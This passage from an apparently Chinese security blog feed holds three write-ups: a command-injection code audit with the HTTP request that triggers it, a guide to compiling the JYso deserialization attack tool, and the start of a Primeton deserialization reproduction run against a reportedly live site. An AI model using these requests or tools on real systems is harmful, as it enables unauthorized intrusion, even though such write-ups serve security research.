sub_25CFC(&quot;inputCode&quot;, v3, 8);  </code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311454129.png" alt="确实很像"><br>我们看到exp里面有这个addr_value 我看追踪看看<br>我们看到知道v5是219的时候我们根据以下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311500368.png" alt="跟进exp"><br>我们看到下图</p><pre class="language-C" data-language="C"><code class="language-C">int sub_171CE()&#123;  int v1; &#x2F;&#x2F; [sp+8h] [bp+8h] BYREF  int v2; &#x2F;&#x2F; [sp+Ch] [bp+Ch] BYREF  _BYTE v3[40]; &#x2F;&#x2F; [sp+10h] [bp+10h] BYREF  memset(v3, 0, sizeof(v3));  sub_25CFC((int)&quot;pingname&quot;, v3, 40);  sub_26274(&quot;pingtime&quot;, &amp;v2, 5);  sub_26274(&quot;packetsize&quot;, &amp;v1, 56);  sub_1DBD2(v3, v2, v1);  printf(&quot;&lt;script language&#x3D;javascript&gt;window.location.href&#x3D;&#39;webmain?headlist&#x3D;%d&amp;list&#x3D;%d&#39;&lt;&#x2F;script&gt;&quot;, 3, 4);  return 0;&#125;</code></pre><p>我们看到v3 v2 v1都被赋予大小 其中V3 长度是40 传入sub_1DBD2<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311501204.png" alt="追踪代码"><br>我们继续看sub_1DBD2 我们看到</p><pre class="language-C" data-language="C"><code class="language-C">int __fastcall sub_1DBD2(const char *a1, int a2, int a3)&#123;  char v7[128]; &#x2F;&#x2F; [sp+18h] [bp+10h] BYREF  system(&quot;rm -rf ..&#x2F;www&#x2F;pingresult.txt&quot;);  sprintf(v7, &quot;ping %s -c %d -s %d &gt;&gt; ..&#x2F;www&#x2F;pingresult.txt&quot;, a1, a2, a3);  system(v7);  return 0;&#125;</code></pre><p>上述代码理解为</p><pre class="language-C" data-language="C"><code class="language-C">char v7[10]; &#x2F;&#x2F; 假设v7的容量为10sprintf(v7, &quot;%d&quot;, 2);  V7 被赋值为2 也就是V7&#x3D;2 等于数字二</code></pre><p>所以由上述可以知道 a1 a2 a3 这三个参数都可以可以控制的并且传入system执行造成命令执行我们演示一下</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>main<span class="token operator">/</span>deal HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxx<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">119.0</span><span class="token number">.6045</span><span class="token number">.160</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9If-None-Match: "1363177655"If-Modified-Since: Sat, 20 Apr 2024 12:24:18 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 70addr_value=219&amp;pingname=127.0.0.1&amp;pingtime=1&amp;packetsize=1</span></code></pre><p>执行命令成功。我们在原有exp基础上加入进去一点东西<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311510822.png" alt="执行成功"></p><h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>此漏洞已经集成到我们的工具里面<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311550565.png" alt="自动化"></p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jyso 最新版反序列化工具gradle编译</title>
      <link href="/securitytools/2024/05/articles/c4f380e46ba1f562/"/>
      <url>/securitytools/2024/05/articles/c4f380e46ba1f562/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 最新在搞java反序列化漏洞在github搜索 java反序列化工具突然搜索到一个项目。感觉这个项目可以。作者也在一直更新所以下载下来编译一波。没想到这个是用gradle编译的握擦。我在maven编译的都不怎么熟练。这gradle不是歇菜了。况且我这漏洞已经复现并且已经拿到了webshell。想想这要不就算了。别搞了。后来想了想这个项目作者在一直更新。那如果后续别的工具搞不定的或许可以使用这个项目进行搞。于是就开搞了。这玩意我光编译和解决问题用了两天。最后发现缺少lib包我直接在github找相同的编译成功了。但是打不成功这个不在讨论范围内。相信作者会抽时间更新项目的这么大的项目通读代码前后结合才能知道是什么问题。废话不多说了开干。<br/><br> 项目代码:<a href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a><br/><br>使用方法:<a href="https://github.com/qi4L/JYso/wiki/JYso%E2%80%90CN">https://github.com/qi4L/JYso/wiki/JYso%E2%80%90CN</a></p><h2 id="下载源码编译"><a href="#下载源码编译" class="headerlink" title="下载源码编译"></a>下载源码编译</h2><p> 我们从github下载代码。由于源代码使用idea 编译执行下载idea。我们对代码进行解压。<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011801876.png" alt="源码截图"><br> 解压并且删除图下面画框的.idea 和gradle 使用使用idea打开代码<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011805272.png" alt="删除文件夹"><br> 删除使用idea打开<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011806794.png" alt="删除后"><br>在file找到setting界面找到gradle。创建一个gradle文件夹选择然后按照下图配置。点击应用。点击ok就行了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011809596.png" alt="图配置"><br>然后你会看到下载jar包啥的下载完毕以后你会发现这种错误。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Could</span> not find javax<span class="token punctuation">.</span>media<span class="token punctuation">.</span>jai<span class="token operator">:</span>jai<span class="token operator">-</span>core<span class="token operator">:</span><span class="token number">1.1</span><span class="token number">.3</span><span class="token punctuation">.</span><span class="token class-name">Required</span> by<span class="token operator">:</span>    project <span class="token operator">:</span><span class="token class-name">Possible</span> solution<span class="token operator">:</span> <span class="token operator">-</span> <span class="token class-name">Declare</span> repository providing the artifact<span class="token punctuation">,</span> see the documentation at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token operator">/</span>current<span class="token operator">/</span>userguide<span class="token operator">/</span>declaring_repositories<span class="token punctuation">.</span>html  <span class="token class-name">Could</span> not find com<span class="token punctuation">.</span>oracle<span class="token punctuation">.</span>weblogic<span class="token operator">:</span>weblogic<span class="token operator">-</span>server<span class="token operator">:</span><span class="token number">1.0</span><span class="token punctuation">.</span><span class="token class-name">Required</span> by<span class="token operator">:</span>    project <span class="token operator">:</span><span class="token class-name">Possible</span> solution<span class="token operator">:</span> <span class="token operator">-</span> <span class="token class-name">Declare</span> repository providing the artifact<span class="token punctuation">,</span> see the documentation at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token operator">/</span>current<span class="token operator">/</span>userguide<span class="token operator">/</span>declaring_repositories<span class="token punctuation">.</span>html</code></pre><p>我第一页看到上面的错误就是百度了一波发现就是没有找到包什么的。然后我们在main下面创建一波lib目录然后从找到包。找包过程太坑爹了。所以我直接把包的名字放出来了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011812163.png" alt="创建lib目录"></p><pre class="language-java" data-language="java"><code class="language-java">jai_core<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.3</span><span class="token punctuation">.</span>jarweblogic<span class="token operator">-</span>server<span class="token punctuation">.</span>jarwlthint3client<span class="token punctuation">.</span>jar</code></pre><p>我们把包导入了如何让他识别呢这个是重点我们在build.gradle 文件中写这段代码</p><pre class="language-java" data-language="java"><code class="language-java">api <span class="token function">fileTree</span><span class="token punctuation">(</span>dir<span class="token operator">:</span>'src<span class="token operator">/</span>main<span class="token operator">/</span>lib'<span class="token punctuation">,</span>include<span class="token operator">:</span><span class="token punctuation">[</span><span class="token char">'*.jar'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>点同步两个箭头环绕的。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011820209.png" alt="点同步"><br>出现下图说明识别成功了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011819308.png" alt="识别成功"><br>我们在点同步<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011820209.png" alt="点同步"><br>还是报错。是不是这时候懵逼了。别着急我们没看其他文件我们看看哪里有javax.media.jai:jai-core<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011822054.png" alt="还是报错"><br>最后发现在libs.versions.toml 发现了我们把它注释了。有人说了这注释了不更找不到了。别忘了我们在lib目录里面已经给他jar包了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011824122.png" alt="注释这个叼毛"><br>注释这个叼毛<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011825797.png" alt="同样注释这个叼毛"><br>然后在同步后续又报错了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span>InvalidUserDataException</span><span class="token operator">:</span> <span class="token class-name">Invalid</span> catalog definition<span class="token operator">:</span>  <span class="token operator">-</span> <span class="token class-name">Problem</span><span class="token operator">:</span> <span class="token class-name">In</span> version catalog libs<span class="token punctuation">,</span> version reference 'javax<span class="token punctuation">.</span>media<span class="token punctuation">.</span>jai<span class="token punctuation">.</span>jai<span class="token punctuation">.</span>core<span class="token char">' doesn'</span>t exist<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">131</span>ms</code></pre><p>走到这时候是不是有马在心中崩腾我也是沃日。我们冷静看看还有东西没有干掉。libs.versions.toml<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011829490.png" alt="在注释"><br>同步一下又报错了。这是我尼玛想摔键盘了。但是这时候他告诉我们那里有问题了。没错就是\build.gradle’ line: 37</p><pre class="language-java" data-language="java"><code class="language-java">FAILURE<span class="token operator">:</span> <span class="token class-name">Build</span> failed <span class="token keyword">with</span> <span class="token namespace">an</span> exception<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token class-name">Where</span><span class="token operator">:</span><span class="token class-name">Build</span> file '<span class="token class-name">C</span><span class="token operator">:</span>\<span class="token class-name">Users</span>\<span class="token class-name">Administrator</span>\<span class="token class-name">Desktop</span>\gradleproject\<span class="token class-name">JYso</span><span class="token operator">-</span>master\build<span class="token punctuation">.</span>gradle' line<span class="token operator">:</span> <span class="token number">37</span><span class="token operator">*</span> <span class="token class-name">What</span> went wrong<span class="token operator">:</span><span class="token class-name">A</span> problem occurred evaluating root project <span class="token char">'JYso'</span><span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">No</span> such property<span class="token operator">:</span> media <span class="token keyword">for</span> <span class="token keyword">class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>accessors<span class="token punctuation">.</span>dm<span class="token punctuation">.</span></span>LibrariesForLibs</span>$<span class="token class-name">JavaxLibraryAccessors</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">162</span>ms</code></pre><p>我们看看37行是有个啥。直接注释<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011831067.png" alt="这个叼毛"><br>直接注释在同步</p><pre class="language-java" data-language="java"><code class="language-java">FAILURE<span class="token operator">:</span> <span class="token class-name">Build</span> failed <span class="token keyword">with</span> <span class="token namespace">an</span> exception<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token class-name">Where</span><span class="token operator">:</span><span class="token class-name">Build</span> file '<span class="token class-name">C</span><span class="token operator">:</span>\<span class="token class-name">Users</span>\<span class="token class-name">Administrator</span>\<span class="token class-name">Desktop</span>\gradleproject\<span class="token class-name">JYso</span><span class="token operator">-</span>master\build<span class="token punctuation">.</span>gradle' line<span class="token operator">:</span> <span class="token number">39</span><span class="token operator">*</span> <span class="token class-name">What</span> went wrong<span class="token operator">:</span><span class="token class-name">A</span> problem occurred evaluating root project <span class="token char">'JYso'</span><span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">No</span> such property<span class="token operator">:</span> oracle <span class="token keyword">for</span> <span class="token keyword">class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>accessors<span class="token punctuation">.</span>dm<span class="token punctuation">.</span></span>LibrariesForLibs</span>$<span class="token class-name">ComLibraryAccessors</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">426</span>ms</code></pre><p>同样的手段在同步我操看到build success 了这时候是不是眼泪都要流出来了沃日。我也是<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011833104.png" alt="沃日"><br>我们点击build 点击clean<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011834856.png" alt="清理"><br>然我们点击jar。握擦又报错了。看样子是找不到jdk里面的java.exe我们配置一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011835902.png" alt="报错了"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Execution</span> failed <span class="token keyword">for</span> task '<span class="token operator">:</span>compileJava'<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Error</span> <span class="token keyword">while</span> evaluating property 'javaCompiler' of task '<span class="token operator">:</span>compileJava'<span class="token punctuation">.</span>   <span class="token operator">></span> <span class="token class-name">Failed</span> <span class="token keyword">to</span> <span class="token namespace">calculate</span> the value of task '<span class="token operator">:</span>compileJava' property 'javaCompiler'<span class="token punctuation">.</span>      <span class="token operator">></span> <span class="token class-name">The</span> configured executable does not exist <span class="token punctuation">(</span><span class="token class-name">C</span><span class="token operator">:</span>\env\JAVA\jdk1<span class="token punctuation">.</span><span class="token number">8.0_402</span>\bin\javac<span class="token punctuation">.</span>exe<span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">313</span>ms<span class="token number">1</span> actionable task<span class="token operator">:</span> <span class="token number">1</span> executed</code></pre><p>我的是这个路径你们自己看自己的jdk路径。点击clean然后再点击jar<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011837688.png" alt="配置jdk路径"><br>看到下图你是不是以为成功了。我们看看生成的jar包<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011839034.png" alt="假成功"><br>这一看就是没有依赖的jar沃日。陷入怀疑了。不着急。我们在build.gradle<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011840301.png" alt="没有依赖的jar"><br>看到这个sharjar并且有入口函数那估计就是它了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011842438.png" alt="入口函数"><br>我们看到那个Jyso是红色感觉有点坑爹重新重启一下idea让它重新识别一下。当然不重启也行。强迫症可能会重启一下哈哈哈。并且我们看到showjar了。没错就是点一波<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011845330.png" alt="重启了一下果然没有爆红了"><br>我操终于成功了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011848294.png" alt="成功了"><br>测试一下<br>perfect完美。如何强制使用一个特定版本jar包版本再build.gradle里面加入.强制使用 commons-beanutils 1.6.1 版本的jar</p><pre class="language-xml" data-language="xml"><code class="language-xml">implementation('commons-beanutils:commons-beanutils:1.6.1') &#123;     version &#123;         strictly '1.6.1'    &#125;&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011849362.png" alt="成功"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> lib包和编译的修改的东西我放到频道了。并且含有编译成功的。不过低版本打不了代码存在问题。主要是讲解如何编译后续作者更新以后你们可以自己编译。<br/><br> <a href="https://t.me/SoftwareNoticeChannel/418">https://t.me/SoftwareNoticeChannel/418</a></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>普元反序列化漏洞复现探究以及ysoserial各种工具编译鉴赏</title>
      <link href="/penetrationtest/2024/04/articles/bf2db1aeff47d7f9/"/>
      <url>/penetrationtest/2024/04/articles/bf2db1aeff47d7f9/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞复现背景"><a href="#漏洞复现背景" class="headerlink" title="漏洞复现背景"></a>漏洞复现背景</h2><p> 前几天翻公众号微步发布通告 <a href="https://mp.weixin.qq.com/s/DutoC4yeO6_GrzhkZukV0Q">https://mp.weixin.qq.com/s/DutoC4yeO6_GrzhkZukV0Q</a> 说普元存在代码执行漏洞。这时候我看群里和某些小密圈里面poc 都流出来了。一看poc一看就是java反序列化漏洞。那么说到这个。我们需要知道如何构造使用工具java反序列化漏洞利用链。并且得知道这个普元的版本漏洞的版本号是多少我们才可以自定义我们的poc exp 。从而达到攻击的目的。</p><h2 id="使用别人的exp进行攻击"><a href="#使用别人的exp进行攻击" class="headerlink" title="使用别人的exp进行攻击"></a>使用别人的exp进行攻击</h2><p>我们使用别人的exp打一下确定测试站。截图如下:由于为实战环境所以铭感信息都打码。poc url我就不打码了。这个当然是之前的不过都一样。<strong>主要的是遇到java反序列化,我们如何找到利用链构造属于我们自己的exp。这是关键</strong><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291656973.png" alt="别人的exp测试"><br>通过上面的exp我们确定这个网站存在漏洞。那么我们如何确定链的我们知道java反序列化漏洞需要依赖 jdk和第三方jar包。那么我们就看看这个网站有哪些jar不就行了。<br>利用他的poc帮助我们找jar 。apache-tomcat-7.0.54\webapps\default\WEB-INF\lib  至于为啥是这个路径这得需要对java项目比较熟悉。这里我就不做介绍了。大家可以自行补充。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291702440.png" alt="jar包截图"><br>我们把这些jar包过滤出来找我们需要的</p><pre class="language-java" data-language="java"><code class="language-java">activation<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jaralicloudcli<span class="token punctuation">.</span>jarant<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarantisamy<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jarantlr<span class="token operator">-</span><span class="token number">2.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jaraopalliance<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarasm<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jaraxiom<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jaraxiom<span class="token operator">-</span>dom<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jaraxiom<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jaraxis2<span class="token operator">-</span>adb<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jaraxis2<span class="token operator">-</span>codegen<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jaraxis2<span class="token operator">-</span>kernel<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarbackport<span class="token operator">-</span>util<span class="token operator">-</span>concurrent<span class="token operator">-</span><span class="token number">2.2</span><span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>anim<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>awt<span class="token operator">-</span>util<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>bridge<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>codec<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>css<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>css<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>dom<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>ext<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>extension<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>gui<span class="token operator">-</span>util<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>gvt<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>parser<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>script<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>svg<span class="token operator">-</span>dom<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>svggen<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>swing<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>transcoder<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>util<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>util<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>xml<span class="token punctuation">.</span>jarbcprov<span class="token operator">-</span>jdk15<span class="token operator">-</span><span class="token number">1.41</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbfs_client<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_client_eos<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_common<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_console<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_engineall<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_interface<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbps<span class="token operator">-</span>integration<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbps<span class="token operator">-</span>server<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbps<span class="token operator">-</span>taglib4j<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbps<span class="token operator">-</span>taskcenter<span class="token operator">-</span>adapter<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarc3p0<span class="token operator">-</span><span class="token number">0.9</span><span class="token number">.0</span><span class="token punctuation">.</span>jarcglib<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.3</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>control<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>bpff<span class="token punctuation">.</span>base<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>rest<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>retry<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>client<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ext<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>server<span 